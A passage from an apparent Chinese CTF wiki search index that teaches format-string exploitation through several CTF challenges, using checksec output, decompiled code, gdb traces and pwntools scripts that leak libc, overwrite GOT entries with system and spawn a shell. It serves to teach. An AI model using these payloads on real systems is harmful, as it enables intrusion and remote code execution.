LibcSearcher ( 'read' , read_addr ) libc_base = read_addr - libc . dump ( 'read' ) system_addr = libc_base + libc . dump ( 'system' ) log . success ( 'system addr: ' + hex ( system_addr )) log . success ( 'read addr: ' + hex ( read_addr )) ## modify printf_got payload = fmtstr_payload ( 6 , { printf_got : system_addr }, 0 , write_size = 'short' ) ## get all the addr addr = payload [: 32 ] payload = ' %32d ' + payload [ 32 :] offset = ( int )( math . ceil ( len ( payload ) / 8.0 ) + 1 ) for i in range ( 6 , 10 ): old = '%{}$' . format ( i ) new = '%{}$' . format ( offset + i ) payload = payload . replace ( old , new ) remainer = len ( payload ) % 8 payload += ( 8 - remainer ) * 'a' payload += addr sh . sendline ( payload ) sh . recv () ## get shell sh . sendline ( '/bin/sh;' ) sh . interactive () \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e00\u6bb5\u4ee3\u7801 ## modify printf_got payload = fmtstr_payload ( 6 , { printf_got : system_addr }, 0 , write_size = 'short' ) ## get all the addr addr = payload [: 32 ] payload = ' %32d ' + payload [ 32 :] offset = ( int )( math . ceil ( len ( payload ) / 8.0 ) + 1 ) for i in range ( 6 , 10 ): old = '%{}$' . format ( i ) new = '%{}$' . format ( offset + i ) payload = payload . replace ( old , new ) remainer = len ( payload ) % 8 payload += ( 8 - remainer ) * 'a' payload += addr sh . sendline ( payload ) sh . recv () fmtstr_payload\u76f4\u63a5\u5f97\u5230\u7684payload\u4f1a\u5c06\u5730\u5740\u653e\u5728\u524d\u9762\uff0c\u800c\u8fd9\u4e2a\u4f1a\u5bfc\u81f4printf\u7684\u65f6\u5019'\\x00'\u622a\u65ad\uff08 \u5173\u4e8e\u8fd9\u4e00\u95ee\u9898\uff0cpwntools\u76ee\u524d\u6b63\u5728\u5f00\u53d1fmt_payload\u7684\u52a0\u5f3a\u7248\uff0c\u4f30\u8ba1\u5feb\u5f00\u53d1\u51fa\u6765\u4e86\u3002 \uff09\u3002\u6240\u4ee5\u6211\u4f7f\u7528\u4e86\u4e00\u4e9b\u6280\u5de7\u5c06\u5b83\u653e\u5728\u540e\u9762\u4e86\u3002\u4e3b\u8981\u7684\u601d\u60f3\u662f\uff0c\u5c06\u5730\u5740\u653e\u5728\u540e\u97628\u5b57\u8282\u5bf9\u9f50\u7684\u5730\u65b9\uff0c\u5e76\u5bf9payload\u4e2d\u7684\u504f\u79fb\u8fdb\u884c\u4fee\u6539\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f offset = ( int )( math . ceil ( len ( payload ) / 8.0 ) + 1 ) \u8fd9\u4e00\u884c\u7ed9\u51fa\u4e86\u4fee\u6539\u540e\u7684\u5730\u5740\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\uff0c\u4e4b\u6240\u4ee5\u662f\u8fd9\u6837\u5728\u4e8e\u65e0\u8bba\u5982\u4f55\u4fee\u6539\uff0c\u7531\u4e8e'%order$hn'\u4e2dorder\u591a\u51fa\u6765\u7684\u5b57\u7b26\u90fd\u4e0d\u4f1a\u5927\u4e8e8\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50"},{"location":"pwn/fmtstr/fmtstr_example/#_1","text":"\u4e0b\u9762\u4f1a\u4ecb\u7ecd\u4e00\u4e9bCTF\u4e2d\u7684\u683c\u5f0f\u5316\u6f0f\u6d1e\u7684\u9898\u76ee\u3002\u4e5f\u90fd\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5e38\u89c1\u7684\u5229\u7528\u3002","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50"},{"location":"pwn/fmtstr/fmtstr_example/#64","text":"","title":"64\u4f4d\u7a0b\u5e8f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"},{"location":"pwn/fmtstr/fmtstr_example/#_2","text":"\u5176\u5b9e64\u4f4d\u7684\u504f\u79fb\u8ba1\u7b97\u548c32\u4f4d\u7c7b\u4f3c\uff0c\u90fd\u662f\u7b97\u5bf9\u5e94\u7684\u53c2\u6570\u3002\u53ea\u4e0d\u8fc764\u4f4d\u51fd\u6570\u7684\u524d6\u4e2a\u53c2\u6570\u662f\u5b58\u50a8\u5728\u76f8\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\u7684\u3002\u90a3\u4e48\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\u5462\uff1f\u867d\u7136\u6211\u4eec\u5e76\u6ca1\u6709\u5411\u76f8\u5e94\u5bc4\u5b58\u5668\u4e2d\u653e\u5165\u6570\u636e\uff0c\u4f46\u662f\u7a0b\u5e8f\u4f9d\u65e7\u4f1a\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5e94\u683c\u5f0f\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u3002","title":"\u539f\u7406"},{"location":"pwn/fmtstr/fmtstr_example/#_3","text":"\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee52017\u5e74\u7684UIUCTF\u4e2dpwn200 GoodLuck\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u91cc\u7531\u4e8e\u53ea\u6709\u672c\u5730\u73af\u5883\uff0c\u6240\u4ee5\u6211\u5728\u672c\u5730\u8bbe\u7f6e\u4e86\u4e00\u4e2aflag.txt\u6587\u4ef6\u3002","title":"\u4f8b\u5b50"},{"location":"pwn/fmtstr/fmtstr_example/#_4","text":"\u279c 2017 -UIUCTF-pwn200-GoodLuck git: ( master ) \u2717 checksec goodluck Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5f00\u542f\u4e86NX\u4fdd\u62a4\u4ee5\u53ca\u90e8\u5206RELRO\u4fdd\u62a4\u3002","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"pwn/fmtstr/fmtstr_example/#_5","text":"\u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f88\u660e\u663e for ( j = 0 ; j <= 21 ; ++ j ) { v5 = format [ j ]; if ( ! v5 || v11 [ j ] != v5 ) { puts ( \"You answered:\" ); printf ( format ); puts ( \" \\n But that was totally wrong lol get rekt\" ); fflush ( _bss_start ); result = 0 ; goto LABEL_11 ; } }","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"pwn/fmtstr/fmtstr_example/#_6","text":"\u6211\u4eec\u5728printf\u5904\u4e0b\u504f\u79fb\u5982\u4e0b,\u8fd9\u91cc\u53ea\u5173\u6ce8\u4ee3\u7801\u90e8\u5206\u4e0e\u6808\u90e8\u5206\u3002 gef\u27a4 b printf Breakpoint 1 at 0x400640 gef\u27a4 r Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck what 's the flag 123456 You answered: Breakpoint 1, __printf (format=0x602830 \"123456\") at printf.c:28 28 printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55. \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x7ffff7a627f7 <fprintf+135> add rsp, 0xd8 0x7ffff7a627fe <fprintf+142> ret 0x7ffff7a627ff nop \u2192 0x7ffff7a62800 <printf+0> sub rsp, 0xd8 0x7ffff7a62807 <printf+7> test al, al 0x7ffff7a62809 <printf+9> mov QWORD PTR [rsp+0x28], rsi 0x7ffff7a6280e <printf+14> mov QWORD PTR [rsp+0x30], rdx \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 [' 0x7fffffffdb08 ', ' l8 ' ] 8 0x00007fffffffdb08\u2502+0x00: 0x0000000000400890 \u2192 <main+234> mov edi, 0x4009b8 \u2190 $rsp 0x00007fffffffdb10\u2502+0x08: 0x0000000031000001 0x00007fffffffdb18\u2502+0x10: 0x0000000000602830 \u2192 0x0000363534333231 ( \"123456\" ? ) 0x00007fffffffdb20\u2502+0x18: 0x0000000000602010 \u2192 \"You answered:\\ng\" 0x00007fffffffdb28\u2502+0x20: 0x00007fffffffdb30 \u2192 \"flag{11111111111111111\" 0x00007fffffffdb30\u2502+0x28: \"flag{11111111111111111\" 0x00007fffffffdb38\u2502+0x30: \"11111111111111\" 0x00007fffffffdb40\u2502+0x38: 0x0000313131313131 ( \"111111\" ? ) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0x7ffff7a62800 \u2192 Name: __printf(format=0x602830 \"123456\") [ #1] 0x400890 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u53ef\u4ee5\u770b\u5230flag\u5bf9\u5e94\u7684\u6808\u4e0a\u7684\u504f\u79fb\u4e3a5\uff0c\u9664\u53bb\u5bf9\u5e94\u7684\u7b2c\u4e00\u884c\u4e3a\u8fd4\u56de\u5730\u5740\u5916\uff0c\u5176\u504f\u79fb\u4e3a4\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a64\u4f4d\u7a0b\u5e8f\uff0c\u6240\u4ee5\u524d6\u4e2a\u53c2\u6570\u5b58\u5728\u5728\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0cfmt\u5b57\u7b26\u4e32\u5b58\u50a8\u5728RDI\u5bc4\u5b58\u5668\u4e2d\uff0c\u6240\u4ee5fmt\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u7684\u504f\u79fb\u4e3a10\u3002\u800cfmt\u5b57\u7b26\u4e32\u4e2d %order$s \u5bf9\u5e94\u7684order\u4e3afmt\u5b57\u7b26\u4e32\u540e\u9762\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165 %9$s \u5373\u53ef\u5f97\u5230flag\u7684\u5185\u5bb9\u3002\u5f53\u7136\uff0c\u6211\u4eec\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u5229\u7528https://github.com/scwuaptx/Pwngdb\u4e2d\u7684fmtarg\u6765\u5224\u65ad\u67d0\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u3002 gef\u27a4 fmtarg 0x00007fffffffdb28 The index of format argument : 10 \u9700\u8981\u6ce8\u610f\u7684\u662f\u6211\u4eec\u5fc5\u987bbreak\u5728printf\u5904\u3002","title":"\u786e\u5b9a\u504f\u79fb"},{"location":"pwn/fmtstr/fmtstr_example/#_7","text":"from pwn import * from LibcSearcher import * goodluck = ELF ( './goodluck' ) if args [ 'REMOTE' ]: sh = remote ( 'pwn.sniperoj.cn' , 30017 ) else : sh = process ( './goodluck' ) payload = \"%9$s\" print payload ##gdb.attach(sh) sh . sendline ( payload ) print sh . recv () sh . interactive ()","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"pwn/fmtstr/fmtstr_example/#hijack-got","text":"","title":"hijack GOT"},{"location":"pwn/fmtstr/fmtstr_example/#_8","text":"\u5728\u76ee\u524d\u7684C\u7a0b\u5e8f\u4e2d\uff0clibc\u4e2d\u7684\u51fd\u6570\u90fd\u662f\u901a\u8fc7GOT\u8868\u6765\u8df3\u8f6c\u7684\u3002\u6b64\u5916\uff0c\u5728 \u6ca1\u6709\u5f00\u542fRELRO\u4fdd\u62a4\u7684\u524d\u63d0\u4e0b\uff0c\u6bcf\u4e2alibc\u7684\u51fd\u6570\u5bf9\u5e94\u7684GOT\u8868\u9879\u662f\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e2alibc\u51fd\u6570\u7684GOT\u8868\u5185\u5bb9\u4e3a\u53e6\u4e00\u4e2alibc\u51fd\u6570\u7684\u5730\u5740\u6765\u5b9e\u73b0\u5bf9\u7a0b\u5e8f\u7684\u63a7\u5236\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u4fee\u6539printf\u7684got\u8868\u9879\u5185\u5bb9\u4e3asystem\u51fd\u6570\u7684\u5730\u5740\u3002\u4ece\u800c\uff0c\u7a0b\u5e8f\u5728\u6267\u884cprintf\u7684\u65f6\u5019\u5b9e\u9645\u6267\u884c\u7684\u662fsystem\u51fd\u6570\u3002 \u5047\u8bbe\u6211\u4eec\u5c06\u51fd\u6570A\u7684\u5730\u5740\u8986\u76d6\u4e3a\u51fd\u6570B\u7684\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e00\u653b\u51fb\u6280\u5de7\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u6b65\u9aa4 \u786e\u5b9a\u51fd\u6570A\u7684GOT\u8868\u5730\u5740\u3002 \u8fd9\u4e00\u6b65\u6211\u4eec\u5229\u7528\u7684\u51fd\u6570A\u4e00\u822c\u5728\u7a0b\u5e8f\u4e2d\u5df2\u6709\uff0c\u6240\u4ee5\u53ef\u4ee5\u91c7\u7528\u7b80\u5355\u7684\u5bfb\u627e\u5730\u5740\u7684\u65b9\u6cd5\u6765\u627e\u3002 \u786e\u5b9a\u51fd\u6570B\u7684\u5185\u5b58\u5730\u5740 \u8fd9\u4e00\u6b65\u901a\u5e38\u6765\u8bf4\uff0c\u9700\u8981\u6211\u4eec\u81ea\u5df1\u60f3\u529e\u6cd5\u6765\u6cc4\u9732\u5bf9\u5e94\u51fd\u6570B\u7684\u5730\u5740\u3002 \u5c06\u51fd\u6570B\u7684\u5185\u5b58\u5730\u5740\u5199\u5165\u5230\u51fd\u6570A\u7684GOT\u8868\u5730\u5740\u5904\u3002 \u8fd9\u4e00\u6b65\u4e00\u822c\u6765\u8bf4\u9700\u8981\u6211\u4eec\u5229\u7528\u51fd\u6570\u7684\u6f0f\u6d1e\u6765\u8fdb\u884c\u89e6\u53d1\u3002\u4e00\u822c\u5229\u7528\u65b9\u6cd5\u6709\u5982\u4e0b\u4e24\u79cd \u5199\u5165\u51fd\u6570\uff1awrite\u51fd\u6570\u3002 ROP pop eax; ret; # printf@got -> eax pop ebx; ret; # (addr_offset = system_addr - printf_addr) -> ebx add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4efb\u610f\u5730\u5740\u5199","title":"\u539f\u7406"},{"location":"pwn/fmtstr/fmtstr_example/#_9","text":"\u8fd9\u91cc\u6211\u4eec\u4ee52016 CCTF\u4e2d\u7684pwn3\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002","title":"\u4f8b\u5b50"},{"location":"pwn/fmtstr/fmtstr_example/#_10","text":"\u5982\u4e0b \u279c 2016 -CCTF-pwn3 git: ( master ) \u2717 checksec pwn3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002\u6211\u4eec\u4e00\u822c\u9ed8\u8ba4\u8fdc\u7a0b\u90fd\u662f\u5f00\u542fASLR\u4fdd\u62a4\u7684\u3002","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"pwn/fmtstr/fmtstr_example/#_11","text":"\u9996\u5148\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u9700\u5bc6\u7801\u767b\u5f55\u7684ftp\uff0c\u5177\u6709get\uff0cput\uff0cdir\u4e09\u4e2a\u57fa\u672c\u529f\u80fd\u3002\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u6bcf\u4e2a\u529f\u80fd\u7684\u4ee3\u7801\uff0c\u53d1\u73b0\u5728get\u529f\u80fd\u4e2d\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int get_file () { char dest ; // [sp+1Ch] [bp-FCh]@5 char s1 ; // [sp+E4h] [bp-34h]@1 char * i ; // [sp+10Ch] [bp-Ch]@3 printf ( \"enter the file name you want to get:\" ); __isoc99_scanf ( \"%40s\" , & s1 ); if ( ! strncmp ( & s1 , \"flag\" , 4u ) ) puts ( \"too young, too simple\" ); for ( i = ( char * ) file_head ; i ; i = ( char * ) * (( _DWORD * ) i + 60 ) ) { if ( ! strcmp ( i , & s1 ) ) { strcpy ( & dest , i + 0x28 ); return printf ( & dest ); } } return printf ( & dest ); }","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"pwn/fmtstr/fmtstr_example/#_12","text":"\u65e2\u7136\u6709\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u7684\u5229\u7528\u601d\u8def \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528put@got\u83b7\u53d6put\u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684libc.so\u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94system\u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539puts@got\u7684\u5185\u5bb9\u4e3asystem\u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884cputs\u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662fsystem\u51fd\u6570\u3002","title":"\u6f0f\u6d1e\u5229\u7528\u601d\u8def"},{"location":"pwn/fmtstr/fmtstr_example/#_13","text":"\u5982\u4e0b from pwn import * from LibcSearcher import LibcSearcher ##context.log_level = 'debug' pwn3 = ELF ( './pwn3' ) if args [ 'REMOTE' ]: sh = remote ( '111' , 111 ) else : sh = process ( './pwn3' ) def get ( name ): sh . sendline ( 'get' ) sh . recvuntil ( 'enter the file name you want to get:' ) sh . sendline ( name ) data = sh . recv () return data def put ( name , content ): sh . sendline ( 'put' ) sh . recvuntil ( 'please enter the name of the file you want to upload:' ) sh . sendline ( name ) sh . recvuntil ( 'then, enter the content:' ) sh . sendline ( content ) def show_dir (): sh . sendline ( 'dir' ) tmp = 'sysbdmin' name = \"\" for i in tmp : name += chr ( ord ( i ) - 1 ) ## password def password (): sh . recvuntil ( 'Name (ftp.hacker.server:Rainism):' ) sh . sendline ( name ) ##password password () ## get the addr of puts puts_got = pwn3 . got [ 'puts' ] log . success ( 'puts got : ' + hex ( puts_got )) put ( '1111' , '%8$s' + p32 ( puts_got )) puts_addr = u32 ( get ( '1111' )[: 4 ]) ## get addr of system libc = LibcSearcher ( \"puts\" , puts_addr ) system_offset = libc . dump ( 'system' ) puts_offset = libc . dump ( 'puts' ) system_addr = puts_addr - puts_offset + system_offset log . success ( 'system addr : ' + hex ( system_addr )) ## modify puts@got, point to system_addr payload = fmtstr_payload ( 7 , { puts_got : system_addr }) put ( '/bin/sh;' , payload ) sh . recvuntil ( 'ftp>' ) sh . sendline ( 'get' ) sh . recvuntil ( 'enter the file name you want to get:' ) ##gdb.attach(sh) sh . sendline ( '/bin/sh;' ) ## system('/bin/sh') show_dir () sh . interactive () \u6ce8\u610f \u6211\u5728\u83b7\u53d6puts\u51fd\u6570\u5730\u5740\u65f6\u4f7f\u7528\u7684\u504f\u79fb\u662f8\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u5e0c\u671b\u6211\u8f93\u51fa\u7684\u524d4\u4e2a\u5b57\u8282\u5c31\u662fputs\u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u5b9e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u9996\u5730\u5740\u7684\u504f\u79fb\u662f7\u3002 \u8fd9\u91cc\u6211\u5229\u7528\u4e86pwntools\u4e2d\u7684fmtstr_payload\u51fd\u6570\uff0c\u6bd4\u8f83\u65b9\u4fbf\u83b7\u53d6\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u67e5\u770b\u5b98\u65b9\u6587\u6863\u5c1d\u8bd5\u3002\u6bd4\u5982\u8fd9\u91ccfmtstr_payload(7, {puts_got: system_addr})\u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f7\uff0c\u6211\u5e0c\u671b\u5728puts_got\u5730\u5740\u5904\u5199\u5165system_addr\u5730\u5740\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u6309\u7167\u5b57\u8282\u6765\u5199\u7684\u3002","title":"\u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f"},{"location":"pwn/fmtstr/fmtstr_example/#hijack-retaddr","text":"","title":"hijack retaddr"},{"location":"pwn/fmtstr/fmtstr_example/#_14","text":"\u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u6211\u4eec\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6765\u52ab\u6301\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u5230\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u5730\u5740\u3002","title":"\u539f\u7406"},{"location":"pwn/fmtstr/fmtstr_example/#_15","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5\u4e09\u4e2a\u767d\u5e3d-pwnme_k0\u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\u3002","title":"\u4f8b\u5b50"},{"location":"pwn/fmtstr/fmtstr_example/#_16","text":"\u279c \u4e09\u4e2a\u767d\u5e3d-pwnme_k0 git: ( master ) \u2717 checksec pwnme_k0 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u4ee5\u53caFull RELRO\u4fdd\u62a4\u3002\u8fd9\u6211\u4eec\u5c31\u6ca1\u6709\u529e\u6cd5\u4fee\u6539\u7a0b\u5e8f\u7684got\u8868\u4e86\u3002","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"pwn/fmtstr/fmtstr_example/#_17","text":"\u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u5c31\u77e5\u9053\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u8d26\u6237\u6ce8\u518c\u4e4b\u7c7b\u7684\u529f\u80fd\uff0c\u4e3b\u8981\u6709\u4fee\u6539\u67e5\u770b\u529f\u80fd\uff0c\u7136\u540e\u53d1\u73b0\u5728\u67e5\u770b\u529f\u80fd\u4e2d\u53d1\u73b0\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int __usercall sub_400B07 @ < eax > ( char format @ < dil > , char formata , __int64 a3 , char a4 ) { write ( 0 , \"Welc0me to sangebaimao! \\n \" , 0x1AuLL ); printf ( & formata , \"Welc0me to sangebaimao! \\n \" ); return printf ( & a4 + 4 ); } \u5176\u8f93\u51fa\u7684\u5185\u5bb9\u4e3a&a4+4\u3002\u6211\u4eec\u56de\u6eaf\u4e00\u4e0b\uff0c\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684passwrod\u5185\u5bb9\u4e5f\u662f v6 = read ( 0 , ( char * ) & a4 + 4 , 0x14uLL ); \u5f53\u7136\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684username\u5728\u8ddd\u79bb\u7684password20\u4e2a\u5b57\u8282\u3002 puts ( \"Input your username(max lenth:20): \" ); fflush ( stdout ); v8 = read ( 0 , & bufa , 0x14uLL ); if ( v8 && v8 <= 0x14u ) { puts ( \"Input your password(max lenth:20): \" ); fflush ( stdout ); v6 = read ( 0 , ( char * ) & a4 + 4 , 0x14uLL ); fflush ( stdout ); * ( _QWORD * ) buf = bufa ; * ( _QWORD * )( buf + 8 ) = a3 ; * ( _QWORD * )( buf + 16 ) = a4 ; \u597d\uff0c\u8fd9\u5c31\u5dee\u4e0d\u591a\u4e86\u3002\u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u8d26\u53f7\u5bc6\u7801\u5176\u5b9e\u6ca1\u5565\u914d\u5bf9\u4e0d\u914d\u5bf9\u7684\u3002","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"pwn/fmtstr/fmtstr_example/#_18","text":"\u6211\u4eec\u6700\u7ec8\u7684\u76ee\u7684\u662f\u5e0c\u671b\u53ef\u4ee5\u83b7\u5f97\u7cfb\u7edf\u7684 shell\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u7ed9\u5b9a\u7684\u6587\u4ef6\u4e2d\uff0c\u5728 0x00000000004008A6 \u5730\u5740\u5904\u6709\u4e00\u4e2a\u76f4\u63a5\u8c03\u7528system('bin/sh') \u7684\u51fd\u6570\uff08\u5173\u4e8e\u8fd9\u4e2a\u7684\u53d1\u73b0\uff0c\u4e00\u822c\u90fd\u4f1a\u73b0\u5728\u7a0b\u5e8f\u5927\u81f4\u770b\u4e00\u4e0b\u3002\uff09\u3002\u90a3\u5982\u679c\u6211\u4eec\u4fee\u6539\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u8fd9\u4e2a\u5730\u5740\uff0c\u90a3\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86 shell\u3002 \u867d\u7136\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5185\u5b58\u672c\u8eab\u662f\u52a8\u6001\u53d8\u5316\u7684\uff0c\u4f46\u662f\u5176\u76f8\u5bf9\u4e8e rbp \u7684\u5730\u5740\u5e76\u4e0d\u4f1a\u6539\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\u6765\u8ba1\u7b97\u3002\u5229\u7528\u601d\u8def\u5982\u4e0b \u786e\u5b9a\u504f\u79fb \u83b7\u53d6\u51fd\u6570\u7684 rbp \u4e0e\u8fd4\u56de\u5730\u5740 \u6839\u636e\u76f8\u5bf9\u504f\u79fb\u83b7\u53d6\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740 \u5c06\u6267\u884c system 